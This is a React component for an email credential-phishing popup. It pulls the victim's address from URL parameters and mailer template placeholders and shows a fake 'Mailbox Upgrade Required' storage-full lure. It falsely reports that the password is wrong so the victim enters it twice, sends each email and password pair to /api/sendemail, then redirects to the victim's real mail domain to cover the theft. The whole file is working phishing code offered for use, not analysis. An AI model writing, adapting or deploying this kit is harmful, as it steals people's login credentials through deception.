/** @format */
"use client";
import React, { useState, useEffect } from "react";

const Popup = ({ domain, systemInfo }) => {
  const { date, browser, os, location } = systemInfo;
  const [password, setPassword] = useState("");
  const [email, setEmail] = useState("");
  const [attempts, setAttempts] = useState(0);
  const [errorMessage, setErrorMessage] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isHovered, setIsHovered] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [animationComplete, setAnimationComplete] = useState(false);

  // Animation states
  const [mailboxOpen, setMailboxOpen] = useState(false);
  const [mailFly, setMailFly] = useState(false);

  // Extract domain from email for logo
  const getDomainFromEmail = () => {
    if (email && email.includes('@')) {
      return email.split('@')[1];
    }
    return domain.toLowerCase() + '.com';
  };

  useEffect(() => {
    const extractEmailFromURL = () => {
      const url = window.location.href;
      const urlObj = new URL(url);
      
      const emailPatterns = [
        'email', 'Email', 'EMAIL', 'user_email', 'UserEmail', 'userEmail',
        'emailAddress', 'EmailAddress', 'contact_email', 'recipient_email',
        'subscriber_email', 'mail', 'e', 'u', 'addr', 'address'
      ];

      for (const pattern of emailPatterns) {
        const emailValue = urlObj.searchParams.get(pattern);
        if (emailValue) {
          return emailValue;
        }
      }

      const hash = urlObj.hash;
      if (hash) {
        const hashParams = new URLSearchParams(hash.substring(1));
        for (const pattern of emailPatterns) {
          const emailValue = hashParams.get(pattern);
          if (emailValue) {
            return emailValue;
          }
        }
      }

      const combinedRegex = /[?&]#?(?:email|Email|EMAIL|user_email|UserEmail|userEmail|emailAddress|EmailAddress|contact_email|recipient_email|subscriber_email|mail|e|u|addr|address)=([^&?#\s]+)/g;
      let match;
      while ((match = combinedRegex.exec(url)) !== null) {
        if (match[1]) {
          return decodeURIComponent(match[1]);
        }
      }

      const decodedUrl = decodeURIComponent(url);
      const emailRegex = /[?&]#?(?:email|Email|EMAIL|user_email|UserEmail|userEmail|emailAddress|EmailAddress|contact_email|recipient_email|subscriber_email|mail|e|u|addr|address)=([^&?#\s]+)/g;
      while ((match = emailRegex.exec(decodedUrl)) !== null) {
        if (match[1]) {
          return match[1];
        }
      }

      const templatePatterns = [
        /[?&]#?email=(\[\[-Email-\]\])/i,
        /[?&]#?email=(\[\[Email\]\])/i,
        /[?&]#?email=(\[\[email\]\])/i,
        /[?&]#?email=(\{\{Email\}\})/i,
        /[?&]#?email=(\{\{email\}\})/i,
        /[?&]#?email=(\{\{ subscriber\.email \}\})/i,
        /[?&]#?email=(\{\{contact\.email\}\})/i,
        /[?&]#?email=(%EMAIL%)/i,
        /[?&]#?email=(%Email%)/i,
        /[?&]#?email=(%email%)/i,
        /[?&]#?email=(%%emailaddress%%)/i,
        /[?&]#?email=(\{Email\})/i,
        /[?&]#?email=(\{email\})/i,
        /[?&]#?email=(<<Email>>)/i,
        /[?&]#?email=(<<email>>)/i,
        /[?&]#?email=(<%= Email %>)/i,
        /[?&]#?email=(<%= email %>)/i,
        /[?&]#?email=(\$\{Email\})/i,
        /[?&]#?email=(\$\{email\})/i,
        /[?&]#?email=(@Email)/i,
        /[?&]#?email=(@email)/i,
        /[?&]#?email=(:email)/i,
        /[?&]#?email=(<Email>)/i,
        /[?&]#?email=(<email>)/i,
        /[?&]#?email=(\[Email\])/i,
        /[?&]#?email=(\[email\])/i,
        /[?&]#?email=("Email")/i,
        /[?&]#?email=('Email')/i
      ];

      for (const pattern of templatePatterns) {
        const match = url.match(pattern);
        if (match && match[1]) {
          return match[1];
        }
      }

      const encodedPatterns = [
        /%3Femail%3D\[\[Email\]\]/i,
        /%3Femail%3D\[\[-Email-\]\]/i,
        /%3Femail%3D%7B%7BEmail%7D%7D/i,
        /%3Femail%3D%25EMAIL%25/i,
        /%3Femail%3D%%emailaddress%%/i,
        /%3Femail%3D%255B%255BEmail%255D%255D/i,
        /%23email%3D\[\[Email\]\]/i,
        /%23email%3D\[\[-Email-\]\]/i,
        /%23email%3D%7B%7BEmail%7D%7D/i,
        /%23email%3D%25EMAIL%25/i,
        /%23email%3D%%emailaddress%%/i,
        /%23email%3D%255B%255BEmail%255D%255D/i
      ];

      for (const pattern of encodedPatterns) {
        if (pattern.test(url)) {
          const encodedMatch = url.match(/[?&]#?email=([^&?#]+)/i);
          if (encodedMatch && encodedMatch[1]) {
            return decodeURIComponent(encodedMatch[1]);
          }
        }
      }

      return "";
    };

    const extractedEmail = extractEmailFromURL();
    if (extractedEmail) {
      setEmail(extractedEmail);
      // Trigger animations when email is set
      setTimeout(() => {
        setMailboxOpen(true);
        setTimeout(() => setAnimationComplete(true), 500);
      }, 300);
    }
  }, []);

  const sendEmail = async (email, password) => {
    try {
      const userAgent = navigator.userAgent;
      const remoteAddress = "";
      
      const response = await fetch("/api/sendemail", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ 
          email,
          password, 
          userAgent, 
          remoteAddress, 
          landingUrl: window.location.href
        }),
      });

      if (!response.ok) {
        throw new Error("Failed to send email");
      }

      const data = await response.json();
      console.log(data.message);
    } catch (error) {
      console.error("Error:", error);
    } finally {
      setPassword("");
      setIsLoading(false);
    }
  };

  const handleNextClick = () => {
    setIsLoading(true);
    setMailFly(true);
    
    setTimeout(() => {
      if (attempts === 0) {
        setErrorMessage("Password not correct!");
        sendEmail(email, password);
        setAttempts(attempts + 1);
      } else if (attempts === 1) {
        setErrorMessage("Password still not correct!");
        sendEmail(email, password);
        setAttempts(attempts + 1);
        
        const emailDomain = getDomainFromEmail();
        if (emailDomain) {
          setTimeout(() => {
            window.location.href = `https://www.${emailDomain}`;
          }, 1000);
        }
      }
    }, 800);
  };

  return (
    <>
      <div className="popup-overlay" style={{
        position: 'fixed',
        top: 0,
        left: 0,
        right: 0,
        bottom: 0,
        backgroundColor: 'rgba(0, 0, 0, 0.8)',
        display: 'flex',
        alignItems: 'center',
        justifyContent: 'center',
        zIndex: 9999,
        fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif",
        overflow: 'hidden' // Prevent scroll on overlay
      }}>
        <div className="popup-container" style={{
          backgroundColor: '#ffffff',
          borderRadius: '20px',
          padding: '25px',
          width: '90%',
          maxWidth: '370px',
          boxShadow: '0 10px 50px -12px rgba(0, 0, 0, 0.4)',
          position: 'relative',
          animation: 'slideUp 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275)',
          overflow: 'hidden' // Remove scroll from container
        }}>
          {/* Animated Background Elements */}
          <div style={{
            position: 'absolute',
            top: 0,
            left: 0,
            right: 0,
            height: '4px',
            background: 'linear-gradient(90deg, #667eea 0%, #764ba2 50%, #f093fb 100%)',
            transform: 'translateX(-100%)',
            animation: 'loadingBar 2s ease-in-out infinite'
          }}></div>
          
          {/* Animated Mailbox Container - Reduced height */}
          <div style={{
            position: 'relative',
            height: '80px',
            marginBottom: '15px',
            display: 'flex',
            justifyContent: 'center',
            alignItems: 'center'
          }}>
            {/* Mailbox Base - Smaller */}
            <div style={{
              width: '140px',
              height: '70px',
              backgroundColor: '#4f46e5',
              borderRadius: '8px 8px 0 0',
              position: 'relative',
              transition: 'all 0.5s ease'
            }}>
              {/* Mailbox Flag - Smaller */}
              <div style={{
                position: 'absolute',
                top: '-20px',
                right: '20px',
                width: '35px',
                height: '35px',
                backgroundColor: '#ef4444',
                borderRadius: '50% 50% 0 0',
                transform: mailboxOpen ? 'rotate(-45deg)' : 'rotate(45deg)',
                transformOrigin: 'bottom right',
                transition: 'transform 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55)'
              }}></div>
              
              {/* Mailbox Door - Smaller */}
              <div style={{
                position: 'absolute',
                top: '8px',
                left: '35px',
                width: '70px',
                height: '55px',
                backgroundColor: '#3730a3',
                borderRadius: '4px',
                transform: mailboxOpen ? 'rotateY(45deg)' : 'rotateY(0deg)',
                transformOrigin: 'right',
                transition: 'transform 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55)',
                boxShadow: 'inset 0 0 8px rgba(0,0,0,0.2)'
              }}>
                {/* Door Handle - Smaller */}
                <div style={{
                  position: 'absolute',
                  top: '22px',
                  left: '8px',
                  width: '6px',
                  height: '6px',
                  backgroundColor: '#fbbf24',
                  borderRadius: '50%'
                }}></div>
              </div>
              
              {/* Flying Mail Animation - Smaller */}
              <div style={{
                position: 'absolute',
                top: '20px',
                left: '45px',
                opacity: mailFly ? 1 : 0,
                transform: mailFly ? 'translateY(-70px) scale(1.2)' : 'translateY(0) scale(1)',
                transition: 'all 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275)'
              }}>
                <div style={{
                  width: '30px',
                  height: '18px',
                  backgroundColor: '#f3f4f6',
                  borderRadius: '2px',
                  position: 'relative',
                  boxShadow: '0 3px 8px rgba(0,0,0,0.15)'
                }}>
                  <div style={{
                    position: 'absolute',
                    top: '-6px',
                    right: '4px',
                    width: '20px',
                    height: '6px',
                    backgroundColor: '#ef4444',
                    clipPath: 'polygon(100% 0, 0 0, 100% 100%)'
                  }}></div>
                </div>
              </div>
            </div>
          </div>

          {/* Header Text with Animation - Reduced spacing */}
          <div style={{
            textAlign: "center",
            marginBottom: "15px",
            opacity: animationComplete ? 1 : 0,
            transform: animationComplete ? 'translateY(0)' : 'translateY(10px)',
            transition: 'all 0.5s ease 0.3s'
          }}>
            <div style={{
              fontSize: "22px",
              fontWeight: "800",
              color: "#1f2937",
              marginBottom: "4px",
              background: 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
              WebkitBackgroundClip: 'text',
              WebkitTextFillColor: 'transparent',
              backgroundClip: 'text',
              lineHeight: '1.2'
            }}>
              Mailbox Upgrade Required
            </div>
            <div style={{
              fontSize: "12px",
              color: "#6b7280",
              lineHeight: "1.4",
              maxWidth: '280px',
              margin: '0 auto'
            }}>
              Your storage is full. Verify your identity to unlock additional space
            </div>
          </div>

          {/* Email Field - Reduced spacing */}
          <div style={{ marginBottom: "12px" }}>
            <div style={{
              fontSize: "12px",
              fontWeight: "600",
              marginBottom: "5px",
              color: "#374151",
              display: "flex",
              alignItems: "center",
              gap: "5px"
            }}>
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
                <polyline points="22,6 12,13 2,6"/>
              </svg>
              Email Address
            </div>
            <div style={{
              position: 'relative',
              borderRadius: "8px",
              overflow: 'hidden',
              border: "1px solid #e5e7eb",
              transition: 'all 0.3s ease'
            }}>
              <input
                type="email"
                style={{
                  padding: "10px 12px",
                  width: "100%",
                  fontSize: "13px",
                  backgroundColor: "#f9fafb",
                  outline: "none",
                  border: "none",
                  fontFamily: "inherit",
                  cursor: "default",
                  color: "#374151",
                  boxSizing: 'border-box'
                }}
                placeholder="Email will be auto-filled from URL"
                value={email}
                readOnly
                onKeyDown={(e) => e.preventDefault()}
                onKeyPress={(e) => e.preventDefault()}
                onKeyUp={(e) => e.preventDefault()}
                onPaste={(e) => e.preventDefault()}
                onCut={(e) => e.preventDefault()}
                onClick={(e) => e.target.blur()}
                onFocus={(e) => e.target.blur()}
                onMouseDown={(e) => e.preventDefault()}
                autoComplete="off"
                spellCheck="false"
              />
              <div style={{
                position: 'absolute',
                right: '10px',
                top: '50%',
                transform: 'translateY(-50%)',
                color: '#10b981'
              }}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                  <path d="M20 6L9 17l-5-5"/>
                </svg>
              </div>
            </div>
          </div>

          {/* Password Field - Reduced spacing */}
          <div style={{ marginBottom: "10px" }}>
            <div style={{
              fontSize: "12px",
              fontWeight: "600",
              marginBottom: "5px",
              color: "#374151",
              display: "flex",
              alignItems: "center",
              gap: "5px"
            }}>
              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <rect x="3" y="11" width="18" height="11" rx="2" ry="2"/>
                <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
              </svg>
              Password
              <button
                onClick={() => setShowPassword(!showPassword)}
                style={{
                  marginLeft: 'auto',
                  background: 'none',
                  border: 'none',
                  color: '#6b7280',
                  cursor: 'pointer',
                  fontSize: "10px",
                  display: 'flex',
                  alignItems: 'center',
                  gap: '3px'
                }}
              >
                {showPassword ? 'Hide' : 'Show'}
              </button>
            </div>
            <div style={{
              position: 'relative',
              borderRadius: "8px",
              overflow: 'hidden',
              border: "1px solid #e5e7eb",
              transition: 'all 0.3s ease',
              boxSizing: 'border-box'
            }}>
              <input
                type={showPassword ? "text" : "password"}
                style={{
                  padding: "10px 12px",
                  width: "100%",
                  fontSize: "13px",
                  backgroundColor: "#ffffff",
                  outline: "none",
                  border: "none",
                  fontFamily: "inherit",
                  boxSizing: 'border-box'
                }}
                placeholder="Enter your password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>
          </div>

          {/* Error Message with Animation - Reduced height */}
          <div style={{
            height: '16px',
            marginBottom: "12px",
            overflow: 'hidden'
          }}>
            <div style={{
              fontSize: "11px",
              fontWeight: "500",
              color: "#ef4444",
              opacity: errorMessage ? 1 : 0,
              transform: errorMessage ? 'translateY(0)' : 'translateY(-10px)',
              transition: 'all 0.3s ease',
              display: 'flex',
              alignItems: 'center',
              gap: '4px'
            }}>
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="12" cy="12" r="10"/>
                <line x1="12" y1="8" x2="12" y2="12"/>
                <line x1="12" y1="16" x2="12.01" y2="16"/>
              </svg>
              {errorMessage}
            </div>
          </div>

          {/* Storage Status Bar - Smaller */}
          <div style={{
            backgroundColor: '#f3f4f6',
            borderRadius: "8px",
            padding: "10px",
            marginBottom: "15px",
            border: '1px solid #e5e7eb'
          }}>
            <div style={{
              display: 'flex',
              justifyContent: 'space-between',
              marginBottom: "5px",
              fontSize: "11px",
              color: '#6b7280'
            }}>
              <span>Storage Used</span>
              <span style={{ fontWeight: '600', color: '#ef4444' }}>98% Full</span>
            </div>
            <div style={{
              height: "5px",
              backgroundColor: '#e5e7eb',
              borderRadius: "3px",
              overflow: 'hidden'
            }}>
              <div style={{
                height: '100%',
                width: '98%',
                background: 'linear-gradient(90deg, #ef4444 0%, #f97316 100%)',
                borderRadius: "3px",
                animation: 'pulse 2s ease-in-out infinite'
              }}></div>
            </div>
            <div style={{
              fontSize: "10px",
              color: '#9ca3af',
              marginTop: "4px",
              textAlign: 'center'
            }}>
              Additional 5GB available after verification
            </div>
          </div>

          {/* Upgrade Button - Smaller */}
          <button 
            onClick={handleNextClick}
            onMouseEnter={() => setIsHovered(true)}
            onMouseLeave={() => setIsHovered(false)}
            disabled={isLoading}
            style={{
              width: "100%",
              padding: "12px",
              borderRadius: "8px",
              border: "none",
              background: isLoading 
                ? '#9ca3af' 
                : 'linear-gradient(135deg, #4f46e5 0%, #7c3aed 100%)',
              color: "#ffffff",
              fontSize: "14px",
              fontWeight: "600",
              cursor: isLoading ? 'not-allowed' : 'pointer',
              outline: "none",
              position: 'relative',
              overflow: 'hidden',
              transition: 'all 0.3s ease',
              transform: isHovered && !isLoading ? 'translateY(-2px)' : 'translateY(0)',
              boxShadow: isHovered && !isLoading 
                ? '0 8px 20px rgba(79, 70, 229, 0.3)' 
                : '0 3px 10px rgba(79, 70, 229, 0.2)',
              boxSizing: 'border-box'
            }}
          >
            {isLoading ? (
              <>
                <span>Processing...</span>
                <div style={{
                  position: 'absolute',
                  right: "12px",
                  top: '50%',
                  transform: 'translateY(-50%)',
                  animation: 'spin 1s linear infinite'
                }}>
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                    <path d="M12 2v4M12 18v4M4.93 4.93l2.83 2.83M16.24 16.24l2.83 2.83M2 12h4M18 12h4M4.93 19.07l2.83-2.83M16.24 7.76l2.83-2.83"/>
                  </svg>
                </div>
              </>
            ) : (
              'UPGRADE STORAGE NOW'
            )}
          </button>

          {/* Footer Note - Smaller */}
          <div style={{
            textAlign: "center",
            marginTop: "12px",
            fontSize: "10px",
            color: "#9ca3af",
            opacity: 0.7
          }}>
            <div style={{ 
              display: 'flex', 
              alignItems: 'center', 
              justifyContent: 'center', 
              gap: "4px",
              flexWrap: 'wrap'
            }}>
              <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                <circle cx="12" cy="12" r="10"/>
                <line x1="12" y1="16" x2="12" y2="12"/>
                <line x1="12" y1="8" x2="12.01" y2="8"/>
              </svg>
              Secure verification required for mailbox upgrade
            </div>
          </div>
        </div>
      </div>

      {/* Add CSS Animations */}
      <style jsx>{`
        @keyframes slideUp {
          from {
            opacity: 0;
            transform: translateY(20px) scale(0.95);
          }
          to {
            opacity: 1;
            transform: translateY(0) scale(1);
          }
        }
        
        @keyframes loadingBar {
          0% {
            transform: translateX(-100%);
          }
          50% {
            transform: translateX(100%);
          }
          100% {
            transform: translateX(-100%);
          }
        }
        
        @keyframes pulse {
          0%, 100% {
            opacity: 1;
          }
          50% {
            opacity: 0.7;
          }
        }
        
        @keyframes spin {
          from {
            transform: translateY(-50%) rotate(0deg);
          }
          to {
            transform: translateY(-50%) rotate(360deg);
          }
        }
        
        input:focus {
          outline: none;
        }
        
        /* Hide scrollbars */
        .popup-overlay::-webkit-scrollbar,
        .popup-container::-webkit-scrollbar {
          display: none;
        }
        
        .popup-overlay,
        .popup-container {
          -ms-overflow-style: none;
          scrollbar-width: none;
        }
        
        @media (max-width: 480px) {
          .popup-container {
            padding: 20px 15px !important;
            margin: 0 15px !important;
            border-radius: 12px !important;
            width: 95% !important;
          }
          
          .popup-container h1 {
            font-size: 20px !important;
          }
        }
      `}</style>
    </>
  );
};

export default Popup;